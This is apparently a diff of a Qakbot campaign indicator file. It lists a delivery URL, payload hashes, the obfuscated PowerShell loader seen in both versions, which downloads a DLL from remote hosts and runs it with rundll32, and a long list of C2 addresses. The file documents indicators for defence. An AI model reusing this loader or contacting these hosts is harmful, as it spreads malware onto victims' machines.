@@ -1,48 +1,50 @@
-16.05.2023 | Qakbot | BB28 | Campaign  | Version 404.1038
+16.05.2023 | Qakbot | BB28 | Campaign 1684249586 | Version 404.1038
 
 *************************************************
 
-.url https://123mkv.dev/iia/?1
-.js 
-.dll 
+.url https://housebizrealty.com/sm/?1
+.js 3b9b3b1df35f8aede09768db8f7a8e6e2bc1aa5b1f775790fdfb727b12aaec64
+.dll ed072d025d7043ac40a79713312cf5e67aaa4facf50e1f1fb61d183d62cbe0a9
 
 *************************************************
 
 Exec >
 
-wscript.exe C:\Users\Admin\AppData\Local\Temp\Mcupmbuw.js
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Petts.js
 
-wscript.exe C:\Users\Admin\AppData\Local\Temp\Mcupmbuw.js Alluvium CuissartOzonised rateableTongueflower 
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Petts.js sloshiest remaining draping 
 
-powershell.exe - WindowStyle Hidden - ExecutionPolicy Bypass - NoLogo - NoProfile - encodedcommand $AntirachiticallyScards = "IlliticUrningism"
-$podophyllum = "aAB0AHQAcABzADoALwAvAGIAYQB2AGkAZQByAGUALgB0AG8AdwBuAA==";
-Start - Sleep - Seconds 8;
-$overnormalize = "aAB0AHQAcAA6AC8ALwBwAHMAeQBjAGgAbwBnAGUAbgBlAHQAaQBjAGEAbABsAHkAVQBuAGMAYQBsAGsAZQBkAC4AYwBoAHIAaQBzAHQAbQBhAHMAryaAB0AHQAcAA6AC8ALwA5ADMALgAyADMANQAuADEAMwA0AC4ANgA1AA==";
-$scoliotoneDionysian = "aAB0AHQAcAA6AC8ALwA3ADcALgA5ADEALgA4ADYALgAxADIAMgAvAFYAbABwAFQALwBSAGoAegAyAEgAdQA4ADMASABIAA==WzFaAB0AHQAcAA6AC8ALwA5ADEALgAxADkAMwAuADQAMwAuADEAMQA5AC8AdABOAGYALwBMAFIAdABDAHkAUgA=";
-foreach($Phrenicohepatic in $scoliotoneDionysian - split "WzF") {
-    $EmersonMicrohabitat = "aAB0AHQAcABzADoALwAvAHUAbgBoAGEAbgBkAHMAZQBsAGUAZAAuAGkAbwA=VJtaAB0AHQAcABzADoALwAvADEAMwAyAC4AMQA1ADYALgAxADUANgAuADEANwAxAA==";
-    $cowherds = "aAB0AHQAcAA6AC8ALwA0ADkALgAyADQANgAuADEANwAxAC4AMQA3ADMA=rWFaAB0AHQAcAA6AC8ALwAxADgANQAuADEAOQA1AC4AMQA1ADIALgAxADQANAA==rWFaAB0AHQAcAA6AC8ALwBzAHAAcgBhAHQAdABlAGQAUwB1AGIAZABvAHUAYgBsAGUALgB2AGkAcAA=";
-    $cycloloma = "aAB0AHQAcAA6AC8ALwA4ADgALgAxADQANQAuADEAMAA1AC4ANAAwAA==KdaAB0AHQAcAA6AC8ALwAxADMAMgAuADEAOAA0AC4AMQAwADEALgAxADkANgA=KdaAB0AHQAcABzADoALwAvADEAMwAzAC4ANwA2AC4AMQAxADEALgA4ADIA";
+powershell.exe - WindowStyle Hidden - ExecutionPolicy Bypass - NoLogo - NoProfile - encodedcommand $informedPyretogenous = "http://151.236.22.114/uewhG/LiU0eKJ8e2E=";
+Start - Sleep - Seconds 12;
+$wipersSensillumla = "aAB0AHQAcAA6AC8ALwA0ADUALgAxADkANwAuADEAMwA5AC4ANQA2AA==";
+$varshaPatentee = "aAB0AHQAcABzADoALwAvADEAMQA3AC4AMQAxADgALgAxADYANwAuADIAMAAyAA==";
+$BelvederesWindgall = "aAB0AHQAcAA6AC8ALwAxADUAOAAuADIANQA1AC4AMgAxADMALgAxADkAMgAvAGwAegBSAC8AWgBtAFEANgBjAA== http://151.236.22.87/V2C7/KNvbWuj aAB0AHQAcAA6AC8ALwAxADUAMQAuADIAMwA2AC4AMgAyAC4AMQAxADQALwB1AGUAdwBoAEcALwBMAGkAVQAwAGUASwBKADgAZQAyAEUA";
+foreach($foujdarrySchwas in $BelvederesWindgall - split "iJJZ") {
+    $deprecationCottonization = "SuperpleaseNightmare";
+    $curvaciousKitbag = "Scoliomas";
+    $hlithskjalf = "aAB0AHQAcAA6AC8ALwAxADkANwAuADQAOQAuADEAMwAzAC4AMQAyADIAlOKaAB0AHQAcABzADoALwAvAGEAdAB0AGUAbgB0AGwAeQBGAGkAZABkAGwAeQAuAGIAYQB5AGUAcgBuAA==lOKaAB0AHQAcAA6AC8ALwA0ADIALgAxADQANQAuADIAMAA5AC4AMQAwADUAlOKaAB0AHQAcABzADoALwAvAHoAbwBuAGEAdABpAG8AbgBzAFMAbwBiAGIAaQBuAGcAbAB5AC4AaQBzAHQA";
     try {
-        $Begripe = "aAB0AHQAcAA6AC8ALwBTAHAAbABhAHQAaABlAHIALgBlAHgAYwBoAGEAbgBnAGUAYsLaAB0AHQAcAA6AC8ALwA4ADEALgA0ADkALgAyADMAOQAuADEAOQAwAA==";
-        $noncredulousnessSawyers = 762;
-        $BeethovenishUnmeekness = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Phrenicohepatic));
-        iwr $BeethovenishUnmeekness - O C: \ProgramData\ AdvertisedImpartialness.HarpsichordistIndazine;
-        $allowedlyDarbyite = "TaotaiConsumptive";
-        $prorogations = "aAB0AHQAcAA6AC8ALwBEAGUAdgBvAHUAdABuAGUAcwBzAC4AYwBvAGEAYwBoAA==";
-        if ((Get - Item - Path C: \ProgramData\ AdvertisedImpartialness.HarpsichordistIndazine).Length - ge 167692) {
-            powershell - encodedcommand "start rundll32 C:\ProgramData\AdvertisedImpartialness.HarpsichordistIndazine,print;VueJS=";
-            $jugularesHydrocinchonine = "tonsuring";
+        $somatologically = "aAB0AHQAcABzADoALwAvADEAOAA0AC4AOAA2AC4AMQAwADkALgAyADMANgA=WyaAB0AHQAcABzADoALwAvADQAOQAuADYANgAuADEANwA1AC4AMQA0ADcAWyaAB0AHQAcAA6AC8ALwBEAG8AYwBrAG0AYQBzAHQAZQByAC4AYwBvAG0AWyaAB0AHQAcAA6AC8ALwAyADQAOAAuADcANAAuADQAMAAuADkANAA=";
+        $Escapes = "Bayogoula";
+        $unscrutinizedLignified = "aAB0AHQAcABzADoALwAvAHQAYQB1AHQAbwBjAGgAcgBvAG4AbwB1AHMALgBzAGkAdABlAA==";
+        $octomerousEnwrapment = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($foujdarrySchwas));
+        iwr $octomerousEnwrapment - O C: \ProgramData\ forvayCottoning.GradgrindianSynthetised;
+        $plainsoledBazookaman = "chinlessFurrowers";
+        if ((Get - Item - Path C: \ProgramData\ forvayCottoning.GradgrindianSynthetised).Length - ge 153902) {
+            powershell - encodedcommand "start rundll32 C:\ProgramData\forvayCottoning.GradgrindianSynthetised,print;VueJS";
+            $nighnesses = 730;
+            $Talaing = "aAB0AHQAcAA6AC8ALwAxADcAOAAuADYANAAuADUAMgAuADcAMgA=wScYaAB0AHQAcABzADoALwAvADEANAA1AC4AMgA0ADAALgAyADIAMAAuADIAMgA2AA==wScYaAB0AHQAcABzADoALwAvAGMAaABhAHIAYwB1AHQAaQBlAHIAcwBSAGUAYwBvAG0AYgBpAG4AZQBkAC4AbgBlAHQA";
+            $Anableps = "aAB0AHQAcAA6AC8ALwBUAGkAdABpAGwAbABhAHQAaQBuAGcAbAB5AC4AcwB0AA==koTaAB0AHQAcABzADoALwAvADEAMQA2AC4AMQA3ADcALgA4ADYALgAyADAANAA=";
             break;
             VueJS;
         }
         VueJS;
     } catch {
-        $Telepicture = "aAB0AHQAcABzADoALwAvAGwAYQB1AHIAaQBlAEcAcgBhAHkAbQBhAGwAawBpAG4ALgBwAGgAbwB0AG8AhtUaAB0AHQAcABzADoALwAvADIANAA0AC4AMQA2ADEALgAyADQAOQAuADIAMwAzAA==htUaAB0AHQAcAA6AC8ALwBjAG8AbgBmAGwAdQB4AGkAYgBpAGwAaQB0AHkALgBoAGEAdQBzAA==";
+        $gelsemin = "LewannaBylander";
+        $illiberal = "aAB0AHQAcAA6AC8ALwAxADIANgAuADcAMwAuADEAMwAyAC4AMQAyADMA";
     }
 }
-$NoncompressionWhoremaster = "AntitraditionalistGloomed";
-$cleptobiosis = "aAB0AHQAcABzADoALwAvAHEAdQBlAGUAcwB0AGkAbgBnAEQAZQBjAHkAbABlAG4AZQAuAHIAZQBwAG8AcgB0AA==EFqaAB0AHQAcABzADoALwAvADIANAA1AC4AMQAzADcALgA4ADYALgA5ADQAEFqaAB0AHQAcABzADoALwAvADIANAA4AC4AMQA3ADEALgAxADIANQAuADEANwA0AA==";
+$Aggressing = 2;
 
 *************************************************
 
@@ -650,3 +652,123 @@ http://151.236.22.87/V2C7/FGYVn
 
 c2's
 
+76.178.148.107:2222
+178.175.187.254:443
+41.62.152.156:443
+51.14.29.227:2222
+47.132.248.132:443
+66.180.226.117:2222
+142.181.206.222:2222
+86.169.48.88:443
+12.172.173.82:20
+94.30.98.134:32100
+37.186.59.197:2222
+72.134.124.16:443
+99.230.89.236:2078
+102.158.201.119:443
+67.10.9.125:995
+184.182.66.109:443
+92.154.17.149:2222
+47.34.30.133:443
+74.92.243.115:50000
+85.104.105.67:443
+70.112.206.5:443
+213.91.235.146:443
+173.178.151.233:443
+70.28.50.223:2083
+62.35.100.38:443
+147.219.4.194:443
+72.188.103.221:443
+98.37.25.99:443
+12.172.173.82:50001
+99.251.67.229:443
+64.127.146.153:443
+76.86.31.59:443
+69.242.31.249:443
+64.121.161.102:443
+71.78.95.86:995
+14.192.241.76:995
+68.14.195.55:995
+92.9.45.20:2222
+198.2.51.242:993
+81.229.117.95:2222
+2.82.8.80:443
+94.196.219.156:443
+201.244.108.183:995
+72.205.104.134:443
+50.68.186.195:443
+82.7.145.109:22
+92.27.86.48:2222
+144.64.226.144:443
+50.68.204.71:993
+12.172.173.82:465
+173.88.135.179:443
+201.208.136.202:2222
+84.35.26.14:995
+47.199.241.39:443
+12.20.0.235:2222
+98.187.21.2:443
+103.123.223.171:443
+96.56.197.26:2083
+24.123.46.234:443
+86.177.199.192:443
+86.176.152.108:443
+47.32.78.150:443
+73.161.176.218:443
+73.230.28.7:443
+91.196.69.63:443
+12.172.173.82:21
+178.152.124.169:443
+74.33.196.114:443
+86.128.15.167:2222
+186.64.87.204:443
+92.1.170.110:995
+68.203.69.96:443
+90.165.109.4:2222
+47.21.51.138:443
+76.16.49.134:443
+88.126.94.4:50000
+67.61.61.31:443
+70.28.50.223:2087
+75.143.236.149:443
+190.28.74.251:443
+75.109.111.89:443
+12.172.173.82:32101
+184.176.35.223:2222
+96.87.28.170:2222
+70.28.50.223:3389
+75.98.154.19:443
+174.118.68.176:443
+47.6.243.7:443
+24.69.137.232:2222
+47.205.25.170:443
+70.53.193.201:2222
+70.28.50.223:32100
+65.95.141.84:2083
+209.243.10.63:443
+70.50.83.139:2222
+108.190.115.159:443
+190.141.193.170:443
+41.227.211.88:443
+86.130.9.227:2222
+151.65.214.218:443
+80.12.88.148:2222
+65.95.141.84:2078
+92.186.69.229:2222
+12.172.173.82:995
+200.109.16.12:2222
+65.190.242.244:443
+173.61.50.155:3389
+105.101.53.126:443
+64.40.4.89:995
+90.78.147.141:2222
+89.114.140.100:443
+172.115.17.50:443
+73.207.160.219:443
+73.228.158.175:443
+183.87.163.165:443
+208.180.17.32:2222
+184.181.75.148:443
+65.95.141.84:2222
+12.172.173.82:2087
+85.104.94.30:443
